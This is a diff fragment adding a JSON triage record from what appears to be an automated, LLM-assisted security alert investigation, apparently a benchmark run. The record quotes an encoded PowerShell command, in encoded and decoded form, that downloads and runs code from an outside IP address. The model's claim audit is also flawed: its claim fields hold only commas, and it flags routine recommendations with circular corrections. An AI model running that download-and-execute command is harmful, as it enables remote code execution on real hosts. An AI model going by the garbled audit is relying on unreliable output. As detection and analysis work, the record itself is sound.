+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment recommends an AV/EDR scan."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The lateral‑movement pattern suggests reviewing file integrity monitoring."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment indicates patching vulnerable software."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment warrants notifying the asset owner."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment requires log preservation."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment suggests correlating with broader environment."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment recommends reviewing authentication logs."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The lateral‑movement pattern indicates reviewing firewall/segmentation."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment suggests reviewing process tree."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment indicates manual review of payload."
+          }
+        ],
+        "flagged_claims": [
+          "Isolate the affected host from the network pending investigation",
+          "Block the source IP at the network perimeter",
+          "Rotate any credentials or secrets that may have been exposed",
+          "Verify whether the source IP/user is a known, expected service account or automation",
+          "Run an antivirus/EDR scan on the affected host",
+          "Review file integrity monitoring output for unauthorized changes on the affected host",
+          "Patch or update the vulnerable software identified for this host",
+          "Notify the asset owner of the affected host or agent",
+          "Preserve logs and evidence for the affected host pending further investigation",
+          "Correlate this indicator against the wider environment beyond this alert's time window",
+          "Review authentication logs for this account over a wider time window",
+          "Review firewall/network segmentation rules for the affected subnet",
+          "Review the parent-child process execution tree for the affected host",
+          "Manually review the decoded command payload for malicious intent"
+        ],
+        "corrections_applied": true
+      },
+      "output_summary": "audited 16 claim(s), 14 flagged",
+      "llm_calls": [
+        {
+          "prompt_ref": "build_self_check_prompt",
+          "prompt": "You are auditing a draft security report against the structured findings that produced it. For EACH numbered claim below, decide whether the structured findings support it. If not, and you can propose a better-supported replacement, provide a correction; otherwise leave correction empty.\n\nCorrelation findings: pattern_type=lateral_movement, evidence_count=55.\nEnrichment findings:\n- domain dev-klyam01.victimcorp.com: unknown (provider none)\n- domain ke.li.yam: unknown (provider none)\n- domain build-helper.js: unknown (provider none)\n- url http://45.146.164.110:8080/u: unknown (provider none)\n- ip 45.146.164.110: unknown (provider none)\n- domain net.webclient: unknown (provider none)\n- domain victimcorp.com: unknown (provider none)\nRisk assessment: severity=high, confidence=high.\n\nCommand line: powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==\nParent command line: \"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ke.li.yam\\Downloads\\build-helper.js\"\nDecoded command segments:\n  - [powershell_encoded] IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')\n\nClaims to audit, in order:\n1. A PowerShell command was encoded and executed via wscript.exe, indicating possible lateral movement and C2 communication.\n2. The event shows a PowerShell command encoded and executed through wscript.exe, which is a common technique for obfuscating malicious activity. The presence of unknown domains, IPs, and a lateral‑movement pattern suggests the attacker is trying to establish a foothold or communicate with a command‑and‑control server. The high‑severity, high‑confidence assessment is based on these indicators aligning with known high‑risk behavior. This activity warrants immediate containment and further investigation.\n3. Isolate the affected host from the network pending investigation\n4. Block the source IP at the network perimeter\n5. Rotate any credentials or secrets that may have been exposed\n6. Verify whether the source IP/user is a known, expected service account or automation\n7. Run an antivirus/EDR scan on the affected host\n8. Review file integrity monitoring output for unauthorized changes on the affected host\n9. Patch or update the vulnerable software identified for this host\n10. Notify the asset owner of the affected host or agent\n11. Preserve logs and evidence for the affected host pending further investigation\n12. Correlate this indicator against the wider environment beyond this alert's time window\n13. Review authentication logs for this account over a wider time window\n14. Review firewall/network segmentation rules for the affected subnet\n15. Review the parent-child process execution tree for the affected host\n16. Manually review the decoded command payload for malicious intent\n\nReturn exactly one audit per claim, in the same order.",
+          "retried": false,
+          "raw_response": null,
+          "reasoning": "We need to produce exactly one audit per claim, in same order. For each claim, decide whether structured findings support it. If not, propose a better-supported replacement, else leave correction empty.\n\nWe have claims 1-16. Need to output audit per claim. Likely format: \"Claim X: [supported/rejected] [correction]\"? The instruction: \"Return exactly one audit per claim, in the same order.\" Probably each line: \"Claim 1: supported\" or \"Claim 1: not supported - replacement: ...\" Need to decide.\n\nStructured findings: correlation pattern lateral_movement, evidence_count=55. Enrichment findings list unknown domains, IPs, etc. Risk assessment severity high, confidence high. Command line shows encoded PowerShell via wscript, downloading from IP 45.146.164.110:8080/ u. So claim 1: \"A PowerShell command was encoded and executed via wscript.exe, indicating possible lateral movement and C2 communication.\" Does structured findings support? Yes, lateral movement pattern, high severity, unknown domains/IPs, C2. So supported. No correction.\n\nClaim 2: \"The event shows a PowerShell command encoded and executed through wscript.exe, which is a common technique for obfuscating malicious activity. The presence of unknown domains, IPs, and a lateral‑movement pattern suggests the attacker is trying to establish a foothold or communicate with a command‑and‑control server. The high‑severity, high‑confidence assessment is based on these indicators aligning with known high‑risk behavior. This activity warrants immediate containment and further investigation.\" Structured findings support? Yes, same. So supported.\n\nClaim 3: \"Isolate the affected host from the network pending investigation\" This is a recommendation, not a claim about findings. The audit is about whether structured findings support it. The claim is a recommendation, not a finding. So does structured findings support it? Not directly. So not supported. Need replacement: \"The lateral‑movement pattern and high‑severity risk assessment indicate the need to isolate the host.\" So correction.\n\nClaim 4: \"Block the source IP at the network perimeter\" Same as recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment and lateral‑movement pattern suggest blocking the source IP.\"\n\nClaim 5: \"Rotate any credentials or secrets that may have been exposed\" Recommendation. Not directly supported. Replacement: \"The unknown domains/IPs and lateral‑movement pattern suggest potential credential exposure, warranting rotation.\"\n\nClaim 6: \"Verify whether the source IP/user is a known, expected service account or automation\" Recommendation. Not directly supported. Replacement: \"The high‑confidence lateral‑movement assessment indicates verifying the source IP/username.\"\n\nClaim 7: \"Run an antivirus/EDR scan on the affected host\" Recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment recommends an AV/EDR scan.\"\n\nClaim 8: \"Review file integrity monitoring output for unauthorized changes on the affected host\" Recommendation. Not directly supported. Replacement: \"The lateral‑movement pattern suggests reviewing file integrity monitoring.\"\n\nClaim 9: \"Patch or update the vulnerable software identified for this host\" Recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment indicates patching vulnerable software.\"\n\nClaim 10: \"Notify the asset owner of the affected host or agent\" Recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment warrants notifying the asset owner.\"\n\nClaim 11: \"Preserve logs and evidence for the affected host pending further investigation\" Recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment requires log preservation.\"\n\nClaim 12: \"Correlate this indicator against the wider environment beyond this alert's time window\" Recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment suggests correlating with broader environment.\"\n\nClaim 13: \"Review authentication logs for this account over a wider time window\" Recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment recommends reviewing authentication logs.\"\n\nClaim 14: \"Review firewall/network segmentation rules for the affected subnet\" Recommendation. Not directly supported. Replacement: \"The lateral‑movement pattern indicates reviewing firewall/segmentation.\"\n\nClaim 15: \"Review the parent‑child process execution tree for the affected host\" Recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment suggests reviewing process tree.\"\n\nClaim 16: \"Manually review the decoded command payload for malicious intent\" Recommendation. Not directly supported. Replacement: \"The high‑severity risk assessment indicates manual review of payload.\"\n\nBut maybe some claims are supported? Only 1 and 2 are directly about findings. Others are recommendations. So all others not supported, need replacement.\n\nThus output 16 lines: \"Claim 1: supported\" etc.\n\nLet's produce exactly that.",
+          "parsed_output": {
+            "audits": [
+              {
+                "claim": ",",
+                "supported": true,
+                "correction": ""
+              },
+              {
+                "claim": ",",
+                "supported": true,
+                "correction": ""
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The lateral‑movement pattern and high‑severity risk assessment indicate the need to isolate the host."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment and lateral‑movement pattern suggest blocking the source IP."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The unknown domains/IPs and lateral‑movement pattern suggest potential credential exposure, warranting rotation."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑confidence lateral‑movement assessment indicates verifying the source IP/username."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment recommends an AV/EDR scan."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The lateral‑movement pattern suggests reviewing file integrity monitoring."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment indicates patching vulnerable software."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment warrants notifying the asset owner."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment requires log preservation."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment suggests correlating with broader environment."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment recommends reviewing authentication logs."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The lateral‑movement pattern indicates reviewing firewall/segmentation."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment suggests reviewing process tree."
+              },
+              {
+                "claim": ",",
+                "supported": false,
+                "correction": "The high‑severity risk assessment indicates manual review of payload."
+              }
+            ]
+          },
+          "attempts": 1,
+          "prompt_tokens": 2029,
+          "completion_tokens": 474,
+          "latency_ms": 19000,
+          "error_kind": null
+        }
+      ],
+      "timestamp": "2026-08-18T02:35:41.891208Z"
+    },
+    {
+      "step_name": "finalize_and_persist",
+      "action": "degraded",
+      "tool_used": "alert_store",
+      "input": {
+        "report_id": "6e50ee83-bd65-4315-bdae-50e1b8249263",
+        "alert_id": "24898897-d412-53fe-a2a8-5073ee119e11"
+      },
+      "output": {
+        "persisted": false
+      },
+      "output_summary": "could not persist report or update alert status: (sqlite3.OperationalError) table reports has no column named triage_verdict_experimental\n[SQL: INSERT INTO reports (report_id, alert_id, generated_at, alert_summary, investigation_timeline, enrichment_findings, risk_assessment, recommended_actions, recommended_actions_freeform_experimental, triage_verdict_experimental, triage_rationale_experimental, llm_usage, command_analysis, uncertainty_notes, status, model_metadata) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)]\n[parameters: ('6e50ee83-bd65-4315-bdae-50e1b8249263', '24898897-d412-53fe-a2a8-5073ee119e11', '2026-08-18 02:35:41.891261', 'A PowerShell command was encoded and executed via wscript.exe, indicating possible lateral movement and C2 communication.', '[{\"step_name\": \"ingest_and_parse\", \"action\": \"completed\", \"tool_used\": null, \"input\": {\"alert_id\": \"24898897-d412-53fe-a2a8-5073ee119e11\", \"rule_id\": ... (45819 characters truncated) ... y\": \"report 6e50ee83-bd65-4315-bdae-50e1b8249263 persisted, alert marked investigated\", \"llm_calls\": [], \"timestamp\": \"2026-08-18T02:35:41.891335Z\"}]', '[{\"indicator_type\": \"domain\", \"indicator_value\": \"dev-klyam01.victimcorp.com\", \"provider_id\": \"none\", \"queried_at\": \"2026-08-18T02:34:59.504282Z\", \"v ... (1655 characters truncated) ... 327Z\", \"verdict\": \"unknown\", \"score\": 0.0, \"raw_response\": {}, \"cache_expires_at\": \"2026-08-18T02:34:59.504327Z\", \"error\": \"no_provider_registered\"}]', '{\"severity\": \"high\", \"confidence\": \"high\", \"rationale\": \"The event shows a PowerShell command encoded and executed through wscript.exe, which is a co ... (301 characters truncated) ...  is based on these indicators aligning with known high\\\\u2011risk behavior. This activity warrants immediate containment and further investigation.\"}', '[\"Escalate to a human analyst for manual review\"]', '[\"Monitor the host for any subsequent PowerShell invocations that reference the same encoded payload or similar obfuscation techniques, as attackers  ... (645 characters truncated) ... s part of a critical system, consider isolating it from the network immediately to prevent further data leakage while preserving forensic evidence.\"]', 'true_positive', 'The presence of a PowerShell command encoded via wscript.exe with a clear C2 URL strongly indicates malicious activity rather than a benign script execution.', '{\"calls\": 6, \"failed_calls\": 0, \"attempts\": 6, \"prompt_tokens\": 7236, \"completion_tokens\": 1289, \"reasoning_chars\": 10329, \"llm_latency_ms\": 48532, \"wall_clock_ms\": 49077}', '{\"command_line\": \"powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwA ... (477 characters truncated) ... DYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==\", \"decoded\": \"IEX (New-Object Net.WebClient).DownloadString(\\'http://45.146.164.110:8080/u\\')\"}]}', 'unsupported claim: \\'Isolate the affected host from the network pending investigation\\'; unsupported claim: \\'Block the source IP at the network peri ... (1039 characters truncated) ...  unsupported claim: \\'Manually review the decoded command payload for malicious intent\\'; 7 enrichment lookup(s) errored or returned unknown verdicts', 'needs_human_review', '{\"model_name\": \"nemotron-3-nano:4b-bench-ctx8k\", \"model_version\": \"none\", \"prompt_version\": \"4e-v1\"}')]\n(Background on this error at: https://sqlalche.me/e/20/e3q8)",
+      "llm_calls": [],
+      "timestamp": "2026-08-18T02:35:41.895436Z"
+    }
+  ],
+  "enrichment_findings": [
+    {
+      "indicator_type": "domain",
+      "indicator_value": "dev-klyam01.victimcorp.com",
+      "provider_id": "none",
+      "queried_at": "2026-08-18T02:34:59.504282Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-18T02:34:59.504282Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "ke.li.yam",
+      "provider_id": "none",
+      "queried_at": "2026-08-18T02:34:59.504303Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-18T02:34:59.504303Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "build-helper.js",
+      "provider_id": "none",
+      "queried_at": "2026-08-18T02:34:59.504311Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-18T02:34:59.504311Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "url",
+      "indicator_value": "http://45.146.164.110:8080/u",
+      "provider_id": "none",
+      "queried_at": "2026-08-18T02:34:59.504315Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-18T02:34:59.504315Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "ip",
+      "indicator_value": "45.146.164.110",
+      "provider_id": "none",
+      "queried_at": "2026-08-18T02:34:59.504319Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-18T02:34:59.504319Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "net.webclient",
+      "provider_id": "none",
+      "queried_at": "2026-08-18T02:34:59.504323Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-18T02:34:59.504323Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "victimcorp.com",
+      "provider_id": "none",
+      "queried_at": "2026-08-18T02:34:59.504327Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-18T02:34:59.504327Z",
+      "error": "no_provider_registered"
+    }
+  ],
+  "risk_assessment": {
+    "severity": "high",
+    "confidence": "high",
+    "rationale": "The event shows a PowerShell command encoded and executed through wscript.exe, which is a common technique for obfuscating malicious activity. The presence of unknown domains, IPs, and a lateral‑movement pattern suggests the attacker is trying to establish a foothold or communicate with a command‑and‑control server. The high‑severity, high‑confidence assessment is based on these indicators aligning with known high‑risk behavior. This activity warrants immediate containment and further investigation."
+  },
+  "recommended_actions": [
+    "Escalate to a human analyst for manual review"
+  ],
+  "recommended_actions_freeform_experimental": [
+    "Monitor the host for any subsequent PowerShell invocations that reference the same encoded payload or similar obfuscation techniques, as attackers often reuse the same command chain across multiple processes.",
+    "Collect the full network traffic captured around the time of the event to verify whether the HTTP request to 45.146.164.110:8080 was actually a legitimate service call or a malicious data exfiltration attempt.",
+    "Check the integrity of the downloaded build-helper.js file on the endpoint to see if it contains additional malicious payloads or is a known compromised script.",
+    "Correlate the observed lateral movement indicators (domains, IPs) with any known threat actor infrastructure or dark web chatter to gauge whether this is part of an ongoing campaign.",
+    "If the endpoint is part of a critical system, consider isolating it from the network immediately to prevent further data leakage while preserving forensic evidence."
+  ],
+  "triage_verdict_experimental": "true_positive",
+  "triage_rationale_experimental": "The presence of a PowerShell command encoded via wscript.exe with a clear C2 URL strongly indicates malicious activity rather than a benign script execution.",
+  "uncertainty_notes": "unsupported claim: 'Isolate the affected host from the network pending investigation'; unsupported claim: 'Block the source IP at the network perimeter'; unsupported claim: 'Rotate any credentials or secrets that may have been exposed'; unsupported claim: 'Verify whether the source IP/user is a known, expected service account or automation'; unsupported claim: 'Run an antivirus/EDR scan on the affected host'; unsupported claim: 'Review file integrity monitoring output for unauthorized changes on the affected host'; unsupported claim: 'Patch or update the vulnerable software identified for this host'; unsupported claim: 'Notify the asset owner of the affected host or agent'; unsupported claim: 'Preserve logs and evidence for the affected host pending further investigation'; unsupported claim: \"Correlate this indicator against the wider environment beyond this alert's time window\"; unsupported claim: 'Review authentication logs for this account over a wider time window'; unsupported claim: 'Review firewall/network segmentation rules for the affected subnet'; unsupported claim: 'Review the parent-child process execution tree for the affected host'; unsupported claim: 'Manually review the decoded command payload for malicious intent'; 7 enrichment lookup(s) errored or returned unknown verdicts",
+  "status": "needs_human_review",
+  "model_metadata": {
+    "model_name": "nemotron-3-nano:4b-bench-ctx8k",
+    "model_version": "none",
+    "prompt_version": "4e-v1"
+  },
+  "command_analysis": {
+    "command_line": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==",
+    "parent_command_line": "\"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ke.li.yam\\Downloads\\build-helper.js\"",
+    "decoded_segments": [
+      {
+        "encoding": "powershell_encoded",
+        "original": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==",
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')"
+      }
+    ]
+  },
+  "llm_usage": {
+    "calls": 6,
+    "failed_calls": 0,
+    "attempts": 6,
+    "prompt_tokens": 7236,
+    "completion_tokens": 1289,
+    "reasoning_chars": 10329,
+    "llm_latency_ms": 48532,
+    "wall_clock_ms": 49077
+  }
+}
